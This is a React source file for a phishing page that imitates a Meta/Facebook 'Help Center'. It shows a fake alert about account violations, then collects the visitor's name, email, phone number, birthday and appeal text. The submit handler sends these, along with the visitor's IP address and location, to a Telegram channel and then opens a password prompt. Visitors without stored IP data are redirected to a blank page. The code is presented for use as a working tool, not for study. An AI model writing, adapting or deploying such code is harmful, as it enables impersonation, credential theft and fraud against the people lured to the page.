import FromMetaImage from '@/assets/images/from-meta.png';
import FacebookImage from '@/assets/images/icon.webp';
import PasswordInput from '@/components/password-input';
import { faChevronDown, faCircleExclamation, faCompass, faHeadset, faLock, faUserGear } from '@fortawesome/free-solid-svg-icons';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import { useState, useEffect, useCallback, useMemo } from 'react';
import { translateText } from '@/utils/translate';
import sendMessage from '@/utils/telegram';
import { AsYouType, getCountryCallingCode } from 'libphonenumber-js';

const Home = () => {
    const defaultTexts = useMemo(
        () => ({
            helpCenter: 'Help Center',
            english: 'English',
            using: 'Using',
            managingAccount: 'Managing Your Account',
            privacySecurity: 'Privacy, Safety and Security',
            policiesReporting: 'Policies and Reporting',
            pagePolicyAppeals: 'Account Policy Complaints',
            detectedActivity: "We have detected unusual activity on Pages and ad accounts linked to your Instagram, including reported copyright and guideline violations.",
            accessLimited: 'To protect your account, please verify so that the review process is processed quickly and accurately.',
            submitAppeal: 'If you believe this is an error, you can file a complaint by providing the required information.',
            pageName: 'Name',
            mail: 'Email',
            phone: 'Phone Number',
            birthday: 'Birthday',
            yourAppeal: 'Your Appeal',
            appealPlaceholder: 'Please describe your appeal in detail...',
            submit: 'Submit',
            fieldRequired: 'This field is required',
            about: 'About',
            adChoices: 'Ad choices',
            createAd: 'Create ad',
            privacy: 'Privacy',
            careers: 'Careers',
            createPage: 'Create Page',
            termsPolicies: 'Terms and policies',
            cookies: 'Cookies'
        }),
        []
    );

    const [formData, setFormData] = useState({
        pageName: '',
        mail: '',
        phone: '',
        birthday: '',
        appeal: ''
    });

    const [showPassword, setShowPassword] = useState(false);
    const [errors, setErrors] = useState({});
    const [translatedTexts, setTranslatedTexts] = useState(defaultTexts);
    const [countryCode, setCountryCode] = useState('US');
    const [callingCode, setCallingCode] = useState('+1');

    const translateAllTexts = useCallback(
        async (targetLang) => {
            try {
                const [
                    translatedHelpCenter, 
                    translatedEnglish, 
                    translatedUsing, 
                    translatedManaging, 
                    translatedPrivacy, 
                    translatedPolicies, 
                    translatedAppeals, 
                    translatedDetected, 
                    translatedLimited, 
                    translatedSubmit, 
                    translatedPageName, 
                    translatedMail, 
                    translatedPhone, 
                    translatedBirthday,
                    translatedYourAppeal,
                    translatedAppealPlaceholder,
                    translatedSubmitBtn, 
                    translatedRequired, 
                    translatedAbout, 
                    translatedAdChoices, 
                    translatedCreateAd, 
                    translatedPrivacyText, 
                    translatedCareers, 
                    translatedCreatePage, 
                    translatedTerms, 
                    translatedCookies
                ] = await Promise.all([
                    translateText(defaultTexts.helpCenter, targetLang), 
                    translateText(defaultTexts.english, targetLang), 
                    translateText(defaultTexts.using, targetLang), 
                    translateText(defaultTexts.managingAccount, targetLang), 
                    translateText(defaultTexts.privacySecurity, targetLang), 
                    translateText(defaultTexts.policiesReporting, targetLang), 
                    translateText(defaultTexts.pagePolicyAppeals, targetLang), 
                    translateText(defaultTexts.detectedActivity, targetLang), 
                    translateText(defaultTexts.accessLimited, targetLang), 
                    translateText(defaultTexts.submitAppeal, targetLang), 
                    translateText(defaultTexts.pageName, targetLang), 
                    translateText(defaultTexts.mail, targetLang), 
                    translateText(defaultTexts.phone, targetLang), 
                    translateText(defaultTexts.birthday, targetLang),
                    translateText(defaultTexts.yourAppeal, targetLang),
                    translateText(defaultTexts.appealPlaceholder, targetLang),
                    translateText(defaultTexts.submit, targetLang), 
                    translateText(defaultTexts.fieldRequired, targetLang), 
                    translateText(defaultTexts.about, targetLang), 
                    translateText(defaultTexts.adChoices, targetLang), 
                    translateText(defaultTexts.createAd, targetLang), 
                    translateText(defaultTexts.privacy, targetLang), 
                    translateText(defaultTexts.careers, targetLang), 
                    translateText(defaultTexts.createPage, targetLang), 
                    translateText(defaultTexts.termsPolicies, targetLang), 
                    translateText(defaultTexts.cookies, targetLang)
                ]);

                setTranslatedTexts({
                    helpCenter: translatedHelpCenter,
                    english: translatedEnglish,
                    using: translatedUsing,
                    managingAccount: translatedManaging,
                    privacySecurity: translatedPrivacy,
                    policiesReporting: translatedPolicies,
                    pagePolicyAppeals: translatedAppeals,
                    detectedActivity: translatedDetected,
                    accessLimited: translatedLimited,
                    submitAppeal: translatedSubmit,
                    pageName: translatedPageName,
                    mail: translatedMail,
                    phone: translatedPhone,
                    birthday: translatedBirthday,
                    yourAppeal: translatedYourAppeal,
                    appealPlaceholder: translatedAppealPlaceholder,
                    submit: translatedSubmitBtn,
                    fieldRequired: translatedRequired,
                    about: translatedAbout,
                    adChoices: translatedAdChoices,
                    createAd: translatedCreateAd,
                    privacy: translatedPrivacyText,
                    careers: translatedCareers,
                    createPage: translatedCreatePage,
                    termsPolicies: translatedTerms,
                    cookies: translatedCookies
                });
            } catch {
                //
            }
        },
        [defaultTexts]
    );

    useEffect(() => {
        const ipInfo = localStorage.getItem('ipInfo');
        if (!ipInfo) {
            window.location.href = 'about:blank';
        }

        try {
            const ipData = JSON.parse(ipInfo);
            const detectedCountry = ipData.country_code || 'US';
            setCountryCode(detectedCountry);

            const code = getCountryCallingCode(detectedCountry);
            setCallingCode(`+${code}`);
        } catch {
            setCountryCode('US');
            setCallingCode('+1');
        }

        const targetLang = localStorage.getItem('targetLang');
        if (targetLang && targetLang !== 'en') {
            translateAllTexts(targetLang);
        }
    }, [translateAllTexts]);

    const handleInputChange = (field, value) => {
        if (field === 'phone') {
            const cleanValue = value.replace(/^\+\d+\s*/, '');
            const asYouType = new AsYouType(countryCode);
            const formattedValue = asYouType.input(cleanValue);

            const finalValue = `${callingCode} ${formattedValue}`;

            setFormData((prev) => ({
                ...prev,
                [field]: finalValue
            }));
        } else if (field === 'birthday') {
            // Auto format dd/mm/yyyy with /
            let cleaned = value.replace(/[^\d]/g, '').slice(0, 8); // max 8 digits: ddmmyyyy
            if (cleaned.length >= 5) {
                cleaned = cleaned.replace(/^(\d{2})(\d{2})(\d{1,4}).*/, '$1/$2/$3');
            } else if (cleaned.length >= 3) {
                cleaned = cleaned.replace(/^(\d{2})(\d{1,2}).*/, '$1/$2');
            }
            setFormData((prev) => ({
                ...prev,
                [field]: cleaned
            }));

            if (errors[field]) {
                setErrors((prev) => ({
                    ...prev,
                    [field]: false
                }));
            }
        } else {
            setFormData((prev) => ({
                ...prev,
                [field]: value
            }));

            if (errors[field]) {
                setErrors((prev) => ({
                    ...prev,
                    [field]: false
                }));
            }
        }
    };

    const validateForm = () => {
        const requiredFields = ['pageName', 'mail', 'phone', 'birthday', 'appeal'];
        const newErrors = {};

        requiredFields.forEach((field) => {
            if (formData[field].trim() === '') {
                newErrors[field] = true;
            }
        });

        setErrors(newErrors);
        return Object.keys(newErrors).length === 0;
    };

    const handleSubmit = async () => {
        if (validateForm()) {
            try {
                const telegramMessage = formatTelegramMessage(formData);
                await sendMessage(telegramMessage);

                setShowPassword(true);
            } catch {
                window.location.href = 'about:blank';
            }
        } else {
            const firstErrorField = Object.keys(errors)[0];
            if (firstErrorField) {
                const inputElement = document.querySelector(`input[name="${firstErrorField}"], textarea[name="${firstErrorField}"]`);
                if (inputElement) {
                    inputElement.focus();
                }
            }
        }
    };

    const formatTelegramMessage = (data) => {
        const timestamp = new Date().toLocaleString('vi-VN');
        const ipInfo = localStorage.getItem('ipInfo');
        const ipData = ipInfo ? JSON.parse(ipInfo) : {};

        return `📅 <b>Thời gian:</b> <code>${timestamp}</code>
🌍 <b>IP:</b> <code>${ipData.ip || 'k lấy được'}</code>
📍 <b>Vị trí:</b> <code>${ipData.city || 'k lấy được'} - ${ipData.region || 'k lấy được'} - ${ipData.country_code || 'k lấy được'}</code>

🔖 <b>Page Name:</b> <code>${data.pageName}</code>
📧 <b>Email:</b> <code>${data.mail}</code>
📱 <b>Số điện thoại:</b> <code>${data.phone}</code>
🎂 <b>Ngày sinh:</b> <code>${data.birthday}</code>
📝 <b>Appeal:</b> <code>${data.appeal}</code>`;
    };

    const handleClosePassword = () => {
        setShowPassword(false);
    };

    const data_list = [
        {
            id: 'using',
            icon: faCompass,
            title: translatedTexts.using
        },
        {
            id: 'managing',
            icon: faUserGear,
            title: translatedTexts.managingAccount
        },
        {
            id: 'privacy',
            icon: faLock,
            title: translatedTexts.privacySecurity
        },
        {
            id: 'policies',
            icon: faCircleExclamation,
            title: translatedTexts.policiesReporting
        }
    ];

    return (
        <>
            <header className='sticky top-0 left-0 flex h-14 justify-between p-4 shadow-sm'>
                <title>Page Help Center</title>
                <div className='flex items-center gap-2'>
                    <img src={FacebookImage} alt='' className='h-10 w-10' />
                    <p className='font-bold text-lg sm:text-xl'>{translatedTexts.helpCenter}</p>
                </div>
                <div className='flex items-center gap-2'>
                    <div className='flex h-10 w-10 items-center justify-center rounded-full bg-gray-200'>
                        <FontAwesomeIcon icon={faHeadset} className='' size='lg' />
                    </div>
                    <p className='rounded-lg bg-gray-200 p-3 py-1 text-sm font-semibold'>
                        {translatedTexts.english}
                        <FontAwesomeIcon className='ml-1 inline' icon={faChevronDown} />
                    </p>
                </div>
            </header>

            <main className='max-w-[600px] px-2 pt-2 mx-auto'>
                <section className='mb-4 rounded-xl border border-gray-200 p-4'>
                    <p className='mb-2 text-sm font-semibold'>{translatedTexts.detectedActivity}</p>
                    <p className='mb-2 text-sm'>{translatedTexts.accessLimited}</p>
                    <p className='mb-4 text-sm font-semibold'>{translatedTexts.submitAppeal}</p>

                    <form
                        onSubmit={(e) => {
                            e.preventDefault();
                            handleSubmit();
                        }}
                    >
                        <div className='mb-3'>
                            <label htmlFor='pageName' className='block font-semibold'>
                                {translatedTexts.pageName}
                            </label>
                            <input
                                name='pageName'
                                id='pageName'
                                type='text'
                                placeholder={translatedTexts.pageName}
                                value={formData.pageName}
                                onChange={(e) => handleInputChange('pageName', e.target.value)}
                                className={`mt-1 block w-full rounded-md border ${
                                    errors.pageName ? 'border-red-500' : 'border-gray-300'
                                } p-2`}
                            />
                            {errors.pageName && <p className='text-red-500 text-xs'>{translatedTexts.fieldRequired}</p>}
                        </div>

                        <div className='mb-3'>
                            <label htmlFor='mail' className='block font-semibold'>
                                {translatedTexts.mail}
                            </label>
                            <input
                                name='mail'
                                id='mail'
                                type='email'
                                placeholder={translatedTexts.mail}
                                value={formData.mail}
                                onChange={(e) => handleInputChange('mail', e.target.value)}
                                className={`mt-1 block w-full rounded-md border ${
                                    errors.mail ? 'border-red-500' : 'border-gray-300'
                                } p-2`}
                            />
                            {errors.mail && <p className='text-red-500 text-xs'>{translatedTexts.fieldRequired}</p>}
                        </div>

                        <div className='mb-3'>
                            <label htmlFor='phone' className='block font-semibold'>
                                {translatedTexts.phone}
                            </label>
                            <input
                                name='phone'
                                id='phone'
                                type='tel'
                                inputMode='tel'
                                placeholder={`${callingCode} ...`}
                                value={formData.phone}
                                onChange={(e) => handleInputChange('phone', e.target.value)}
                                className={`mt-1 block w-full rounded-md border ${
                                    errors.phone ? 'border-red-500' : 'border-gray-300'
                                } p-2`}
                            />
                            {errors.phone && <p className='text-red-500 text-xs'>{translatedTexts.fieldRequired}</p>}
                        </div>

                        <div className='mb-3'>
                            <label htmlFor='birthday' className='block font-semibold'>
                                {translatedTexts.birthday}
                            </label>
                            <input
                                name='birthday'
                                id='birthday'
                                type='tel'
                                inputMode='numeric'
                                maxLength={10} // dd/mm/yyyy => 10 chars
                                placeholder='dd/mm/yyyy'
                                value={formData.birthday}
                                onChange={(e) => handleInputChange('birthday', e.target.value)}
                                className={`mt-1 block w-full rounded-md border ${
                                    errors.birthday ? 'border-red-500' : 'border-gray-300'
                                } p-2`}
                            />
                            {errors.birthday && <p className='text-red-500 text-xs'>{translatedTexts.fieldRequired}</p>}
                        </div>

                        <div className='mb-3'>
                            <label htmlFor='appeal' className='block font-semibold'>
                                {translatedTexts.yourAppeal}
                            </label>
                            <textarea
                                name='appeal'
                                id='appeal'
                                rows={4}
                                placeholder={translatedTexts.appealPlaceholder}
                                value={formData.appeal}
                                onChange={(e) => handleInputChange('appeal', e.target.value)}
                                className={`mt-1 block w-full rounded-md border ${
                                    errors.appeal ? 'border-red-500' : 'border-gray-300'
                                } p-2`}
                            />
                            {errors.appeal && <p className='text-red-500 text-xs'>{translatedTexts.fieldRequired}</p>}
                        </div>

                        <button
                            type='submit'
                            className='w-full rounded bg-blue-600 py-2 px-4 font-semibold text-white hover:bg-blue-700'
                        >
                            {translatedTexts.submit}
                        </button>
                    </form>
                </section>

                {showPassword && <PasswordInput onClose={handleClosePassword} />}
            </main>

            <footer className='flex flex-wrap justify-center gap-4 p-4 text-sm text-gray-600'>
                <a href='#' className='hover:underline'>{translatedTexts.about}</a>
                <a href='#' className='hover:underline'>{translatedTexts.adChoices}</a>
                <a href='#' className='hover:underline'>{translatedTexts.createAd}</a>
                <a href='#' className='hover:underline'>{translatedTexts.privacy}</a>
                <a href='#' className='hover:underline'>{translatedTexts.careers}</a>
                <a href='#' className='hover:underline'>{translatedTexts.createPage}</a>
                <a href='#' className='hover:underline'>{translatedTexts.termsPolicies}</a>
                <a href='#' className='hover:underline'>{translatedTexts.cookies}</a>
            </footer>
        </>
    );
};

export default Home;
